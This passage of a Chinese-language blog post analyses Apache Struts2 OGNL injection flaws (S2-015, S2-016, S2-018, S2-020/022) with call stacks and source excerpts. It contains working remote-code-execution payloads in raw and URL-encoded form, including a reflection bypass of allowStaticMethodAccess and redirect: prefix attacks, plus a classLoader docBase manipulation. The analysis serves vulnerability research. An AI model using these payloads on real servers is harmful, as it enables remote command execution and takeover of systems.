+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410212627921.png" srcset="/img/loading.gif" lazyload alt="image-20250410212627921"></p>
+<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们首先是在 <code>StrutsPrepareAndExecuteFilter#doFilter</code> 或者 <code>FilterDispatcher#doFilter</code> 这个方法 预处理请求</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">旧版本流程：<br>F<span class="hljs-function"><span class="hljs-title">ilterDispatcher</span> -&gt;</span> A<span class="hljs-function"><span class="hljs-title">ctionProxy</span> -&gt;</span> DefaultActionInvocation<br><br>新版本流程：<br>S<span class="hljs-function"><span class="hljs-title">trutsPrepareAndExecuteFilter</span> -&gt;</span> A<span class="hljs-function"><span class="hljs-title">ctionProxy</span> -&gt;</span> DefaultActionInvocation<br></code></pre></td></tr></table></figure>
+
+<p>我们会来到 DefaultActionInvocation#executeResult 处理结果</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411093317878.png" srcset="/img/loading.gif" lazyload alt="image-20250411093317878"></p>
+<p>接着在 StrutsResultSupport#execute 中调用 conditionalParse </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411093426145.png" srcset="/img/loading.gif" lazyload alt="image-20250411093426145"></p>
+<p>后边结合 S2-012 的流程一致了，调用 TextParseUtil#translateVariables 解析 ognl 表达式</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411093701762.png" srcset="/img/loading.gif" lazyload alt="image-20250411093701762"></p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">%&#123;#_memberAccess[<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>]=<span class="hljs-keyword">true</span>,<span class="hljs-meta">@java</span>.lang.Runtime<span class="hljs-meta">@getRuntime</span>().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;.action<br></code></pre></td></tr></table></figure>
+
+<p>url 编码后</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%25</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>b<span class="hljs-variable">%27</span>allowStaticMethodAccess<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>dtrue<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime().exec(<span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7</span>d.action<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411100136738.png" srcset="/img/loading.gif" lazyload alt="image-20250411100136738"></p>
+<blockquote>
+<p>注意这里使用 <code>&#39;</code> 来进行包裹，使用 <code>“”</code> 包裹，会被转义，从而无法执行</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411100400080.png" srcset="/img/loading.gif" lazyload alt="image-20250411100400080"></p>
+</blockquote>
+<p>具体就是发生在 StrutsActionProxy 初始化的时候，封装 actionName 会对他进行实体编码</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411101315385.png" srcset="/img/loading.gif" lazyload alt="image-20250411101315385"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411102155084.png" srcset="/img/loading.gif" lazyload alt="image-20250411102155084"></p>
+<p>调用栈</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">escape:<span class="hljs-number">869</span>, Entities (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.lang)<br>escapeHtml:<span class="hljs-number">505</span>, StringEscapeUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.lang)<br>escapeHtml:<span class="hljs-number">461</span>, StringEscapeUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.lang)<br>&lt;init&gt;:<span class="hljs-number">77</span>, DefaultActionProxy (com<span class="hljs-selector-class">.opensymphony</span>.xwork2)<br>&lt;init&gt;:<span class="hljs-number">38</span>, StrutsActionProxy (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.impl)<br>createActionProxy:<span class="hljs-number">37</span>, StrutsActionProxyFactory (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.impl)<br>createActionProxy:<span class="hljs-number">58</span>, DefaultActionProxyFactory (com<span class="hljs-selector-class">.opensymphony</span>.xwork2)<br>serviceAction:<span class="hljs-number">488</span>, Dispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>doFilter:<span class="hljs-number">434</span>, FilterDispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br></code></pre></td></tr></table></figure>
+
+<h3 id="Struts-2-3-14-2"><a href="#Struts-2-3-14-2" class="headerlink" title="Struts 2.3.14.2"></a>Struts 2.3.14.2</h3><p>在 Struts 2.3.14.2 中，官方将 SecurityMemberAccess 类中成员变量 allowStaticMethodAccess 添加了 final 修饰符，并且将其 set 方法进行了删除。</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411103903928.png" srcset="/img/loading.gif" lazyload alt="image-20250411103903928"></p>
+<p>看到打之前的 payload 已经不能实现命令执行了</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411104246518.png" srcset="/img/loading.gif" lazyload alt="image-20250411104246518"></p>
+<p>这里有两种绕过的方式</p>
+<ol>
+<li>使用反射修改值</li>
+</ol>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span>=false,#f=#_memberAccess<span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.getDeclaredField</span>(<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.setAccessible</span>(true),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.set</span>(#_memberAccess,true),@java<span class="hljs-selector-class">.lang</span>.Runtime@<span class="hljs-built_in">getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;.action<br></code></pre></td></tr></table></figure>
+
+<p>url 编码</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>context<span class="hljs-variable">%5</span>b<span class="hljs-variable">%27</span>xwork.MethodAccessor.denyMethodExecution<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>dfalse<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f<span class="hljs-variable">%3</span>d<span class="hljs-variable">%23</span>_memberAccess.getClass().getDeclaredField(<span class="hljs-variable">%27</span>allowStaticMethodAccess<span class="hljs-variable">%27</span>)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f.setAccessible(<span class="hljs-keyword">true</span>)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f.set(<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%2</span>ctrue)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime().exec(<span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7</span>d.action<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411111021332.png" srcset="/img/loading.gif" lazyload alt="image-20250411111021332"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250411111036753.png" srcset="/img/loading.gif" lazyload alt="image-20250411111036753"></p>
+<ol start="2">
+<li>使用非静态方法</li>
+</ol>
+<blockquote>
+<p>由于双引号 会被 实体编码，我们只能使用单引号</p>
+</blockquote>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span>=false,#pb=new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ProcessBuilder</span>(new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span><span class="hljs-selector-attr">[]</span>&#123;<span class="hljs-string">&#x27;calc&#x27;</span>&#125;),<span class="hljs-selector-id">#pb</span><span class="hljs-selector-class">.start</span>()&#125;.action<br></code></pre></td></tr></table></figure>
+
+<p>url 编码后</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-meta">%24</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%23context</span><span class="hljs-meta">%5B</span><span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3Dfalse</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%23pb</span><span class="hljs-meta">%3Dnew</span><span class="hljs-meta">%20java</span><span class="hljs-built_in">.lang</span>.ProcessBuilder(new<span class="hljs-meta">%20java</span><span class="hljs-built_in">.lang</span>.String<span class="hljs-meta">%5B</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%7B</span><span class="hljs-string">&#x27;calc&#x27;</span><span class="hljs-meta">%7D</span>)<span class="hljs-meta">%2C</span><span class="hljs-meta">%23pb</span>.<span class="hljs-keyword">start</span>()<span class="hljs-meta">%7D</span>.action<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412211502638.png" srcset="/img/loading.gif" lazyload alt="image-20250412211502638"></p>
+<h2 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.15</p>
+<p> 参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-016">https://cwiki.apache.org/confluence/display/WW/S2-016</a></p>
+<p>在 <code>struts2</code> 中，<code>DefaultActionMapper</code> 类支持以 <code>action:</code>、<code>redirect:</code>、<code>redirectAction:</code> 作为导航或是重定向前缀，但是这些前缀后面同时可以跟 <code>OGNL</code> 表达式，由于 <code>struts2</code> 没有对这些前缀做过滤，导致利用 <code>OGNL</code> 表达式调用 <code>java</code> 静态方法执行任意系统命令。</p>
+<p>和 S2-002 一致，都是利用 redirect 重定向时的 ognl 解析，但是入口不太相同</p>
+<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们先来看 DefaultActionMapper 这个类，他定义了一系列的前缀</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412101748318.png" srcset="/img/loading.gif" lazyload alt="image-20250412101748318"></p>
+<p>在初始化时，会去作对应的处理，构造方法的逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultActionMapper</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.prefixTrie = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrefixTrie</span>() &#123;<br>        &#123;<br>            <span class="hljs-comment">// 1. 处理 method: 前缀</span><br>            <span class="hljs-built_in">this</span>.put(<span class="hljs-string">&quot;method:&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String key, ActionMapping mapping)</span> &#123;<br>                    <span class="hljs-keyword">if</span> (DefaultActionMapper.<span class="hljs-built_in">this</span>.allowDynamicMethodCalls) &#123;<br>                        mapping.setMethod(key.substring(<span class="hljs-string">&quot;method:&quot;</span>.length()));<br>                    &#125;<br>                &#125;<br>            &#125;);<br>            <br>            <span class="hljs-comment">// 2. 处理 action: 前缀 </span><br>            <span class="hljs-built_in">this</span>.put(<span class="hljs-string">&quot;action:&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String key, ActionMapping mapping)</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> key.substring(<span class="hljs-string">&quot;action:&quot;</span>.length());<br>                    <span class="hljs-keyword">if</span> (DefaultActionMapper.<span class="hljs-built_in">this</span>.allowDynamicMethodCalls) &#123;<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">bang</span> <span class="hljs-operator">=</span> name.indexOf(<span class="hljs-number">33</span>); <span class="hljs-comment">// 33是&#x27;!&#x27;的ASCII码</span><br>                        <span class="hljs-keyword">if</span> (bang != -<span class="hljs-number">1</span>) &#123;<br>                            mapping.setMethod(name.substring(bang + <span class="hljs-number">1</span>));<br>                            name = name.substring(<span class="hljs-number">0</span>, bang);<br>                        &#125;<br>                    &#125;<br>                    mapping.setName(name);<br>                &#125;<br>            &#125;);<br>            <br>            <span class="hljs-comment">// 3. 处理 redirect: 前缀</span><br>            <span class="hljs-built_in">this</span>.put(<span class="hljs-string">&quot;redirect:&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String key, ActionMapping mapping)</span> &#123;<br>                    <span class="hljs-type">ServletRedirectResult</span> <span class="hljs-variable">redirect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRedirectResult</span>();<br>                    DefaultActionMapper.<span class="hljs-built_in">this</span>.container.inject(redirect);<br>                    redirect.setLocation(key.substring(<span class="hljs-string">&quot;redirect:&quot;</span>.length()));<br>                    mapping.setResult(redirect);<br>                &#125;<br>            &#125;);<br>            <br>            <span class="hljs-comment">// 4. 处理 redirectAction: 前缀</span><br>            <span class="hljs-built_in">this</span>.put(<span class="hljs-string">&quot;redirectAction:&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String key, ActionMapping mapping)</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">location</span> <span class="hljs-operator">=</span> key.substring(<span class="hljs-string">&quot;redirectAction:&quot;</span>.length());<br>                    <span class="hljs-type">ServletRedirectResult</span> <span class="hljs-variable">redirect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRedirectResult</span>();<br>                    DefaultActionMapper.<span class="hljs-built_in">this</span>.container.inject(redirect);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> DefaultActionMapper.<span class="hljs-built_in">this</span>.getDefaultExtension();<br>                    <span class="hljs-keyword">if</span> (extension != <span class="hljs-literal">null</span> &amp;&amp; extension.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                        location = location + <span class="hljs-string">&quot;.&quot;</span> + extension;<br>                    &#125;<br>                    redirect.setLocation(location);<br>                    mapping.setResult(redirect);<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>把不同的前缀对应为了不同的 ParameterAction 并重写了 execute 方法，在重定向解析结果时，会造成二次解析</p>
+<p>入口和 S2-015 一致，都是 <code>StrutsPrepareAndExecuteFilter#doFilter</code> 或者 <code>FilterDispatcher#doFilter</code> 这个方法 预处理请求 调用 <code>DefaultActionMapper#handleSpecialParameters</code> 时，根据前缀走到对应的 execute 方法</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">execute:<span class="hljs-number">217</span>, DefaultActionMapper$<span class="hljs-number">2</span>$<span class="hljs-number">3</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.mapper)<br>handleSpecialParameters:<span class="hljs-number">371</span>, DefaultActionMapper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.mapper)<br>getMapping:<span class="hljs-number">318</span>, DefaultActionMapper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.mapper)<br>doFilter:<span class="hljs-number">409</span>, FilterDispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>internalDoFilter:<span class="hljs-number">241</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">208</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412110620680.png" srcset="/img/loading.gif" lazyload alt="image-20250412110620680"></p>
+<p>后续就和 S2-012 的调用流程一致了</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412111005761.png" srcset="/img/loading.gif" lazyload alt="image-20250412111005761"></p>
+<p>调用栈</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">conditionalParse:<span class="hljs-number">197</span>, StrutsResultSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>execute:<span class="hljs-number">185</span>, StrutsResultSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>execute:<span class="hljs-number">158</span>, ServletRedirectResult (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>serviceAction:<span class="hljs-number">496</span>, Dispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>doFilter:<span class="hljs-number">434</span>, FilterDispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br></code></pre></td></tr></table></figure>
+
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">index.action?redirect:%&#123;#f=#_memberAccess.getClass().getDeclaredField(<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>),#f.setAccessible(<span class="hljs-literal">true</span>),#f.set(#_memberAccess,<span class="hljs-literal">true</span>),@java.lang.Runtime@getRuntime().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<p>url 编码</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">index.action?redirect<span class="hljs-variable">%3</span>a<span class="hljs-variable">%25</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>f<span class="hljs-variable">%3</span>d<span class="hljs-variable">%23</span>_memberAccess.getClass().getDeclaredField(<span class="hljs-variable">%27</span>allowStaticMethodAccess<span class="hljs-variable">%27</span>)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f.setAccessible(<span class="hljs-keyword">true</span>)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>f.set(<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%2</span>ctrue)<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime().exec(<span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7</span>d<br></code></pre></td></tr></table></figure>
+
+<p>或者用前缀 <code>redirectAction</code> </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412111523030.png" srcset="/img/loading.gif" lazyload alt="image-20250412111523030"></p>
+<h2 id="S2-018"><a href="#S2-018" class="headerlink" title="S2-018"></a>S2-018</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.15.2</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-018">https://cwiki.apache.org/confluence/display/WW/S2-018</a></p>
+<p>Struts 2 的动作映射机制支持特殊参数前缀“action:”，该前缀旨在帮助将导航信息附加到表单内的按钮上。</p>
+<p>这个是在 S2-016 的延伸，用 action: 前缀去绕过一下安全限制</p>
+<p>特性其实就是可以利用 <code>action:test!execute</code> 的形式，访问同一命名空间下的其他方法</p>
+<h2 id="S2-020-S2-021-S2-022"><a href="#S2-020-S2-021-S2-022" class="headerlink" title="S2-020&#x2F;S2-021&#x2F;S2-022"></a>S2-020&#x2F;S2-021&#x2F;S2-022</h2><p>这其实就是一个漏洞的不同版本，也是利用参数 ParametersInterceptor 拦截器，去做一些事情，尽管他在前面爆出来的几次漏洞后，对正则表达式做了很多改进，我们可以利用它去修改一些值</p>
+<p>影响版本：Struts 2.0.0 - Struts 2.3.16.3</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-022">https://cwiki.apache.org/confluence/display/WW/S2-022</a></p>
+<p>在 2.3.16 版本的 ParametersInterceptor 中的正则表达式</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-type">ACCEPTED_PARAM_NAMES</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-subst">\\</span>w+((<span class="hljs-subst">\\</span>.<span class="hljs-subst">\\</span>w+)|(<span class="hljs-subst">\\</span>[<span class="hljs-subst">\\</span>d+<span class="hljs-subst">\\</span>])|(<span class="hljs-subst">\\</span>(<span class="hljs-subst">\\</span>d+<span class="hljs-subst">\\</span>))|(<span class="hljs-subst">\\</span>[&#x27;<span class="hljs-subst">\\</span>w+&#x27;<span class="hljs-subst">\\</span>])|(<span class="hljs-subst">\\</span>(&#x27;<span class="hljs-subst">\\</span>w+&#x27;<span class="hljs-subst">\\</span>)))*&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>去掉转移符号</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">\w+((\.\w+)|<span class="hljs-type">(\[\d</span>+\])|<span class="hljs-type">(\(\d</span>+\))|<span class="hljs-type">(\[&#x27;\w</span>+&#x27;\])|<span class="hljs-type">(\(&#x27;\w</span>+&#x27;\)))*<br></code></pre></td></tr></table></figure>
+
+<p>也就是说，他可以匹配 <code>aa.bb.cc.dd</code> 这样的参数</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412142002323.png" srcset="/img/loading.gif" lazyload alt="image-20250412142002323"></p>
+<p>我们可以使用这一特性修改一些 修改 context 及 root  中的一些值</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">class<span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.dirContext</span>.docBase=D:/data<br></code></pre></td></tr></table></figure>
+
+<p>看一下 <code>2.3.16</code> 和 <code>2.3.16.1</code> excludeParams 的对比，看到加入了 <code>^class\..</code> </p>
+<center class="half">
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250412152958382.png" srcset="/img/loading.gif" lazyload width="400"/>
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250412153207376.png" srcset="/img/loading.gif" lazyload width="400"/>
+ </center>
+
+<p>我们利用上面的 payload 可以修改 classLoader 的属性，tomcat 的访问路径，当在获取 class 属性的时候，同时会得到他的 classLoader，我们修改它里面值，实现利用</p>
+<p>当 ongl 去获取 把 <code>class</code> 解析为 ASTProperty 时，会去执行到 getTargetClass，当然会把 classLoader 一并获取到</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412164216799.png" srcset="/img/loading.gif" lazyload alt="image-20250412164216799"></p>
+<p>因为类都是由 Tomcat 容器加载的，所以就获取到了 WebappClassLoader ，依次执行到后边的赋值语句，就可以把 tomcat 的基础访问路路径给改变掉</p>
+<p>对应过去 class 的调用栈</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getPropertyAccessor:</span><span class="hljs-number">2215</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">getProperty:</span><span class="hljs-number">2312</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">114</span>, ASTProperty (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">212</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">258</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValueBody:</span><span class="hljs-number">222</span>, ASTChain (ognl)<br><span class="hljs-symbol">evaluateSetValueBody:</span><span class="hljs-number">220</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">301</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">737</span>, Ognl (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">234</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">trySetValue:</span><span class="hljs-number">183</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">170</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setParameter:</span><span class="hljs-number">148</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setParameters:</span><span class="hljs-number">329</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br><span class="hljs-symbol">doIntercept:</span><span class="hljs-number">241</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br></code></pre></td></tr></table></figure>
+
+<center>
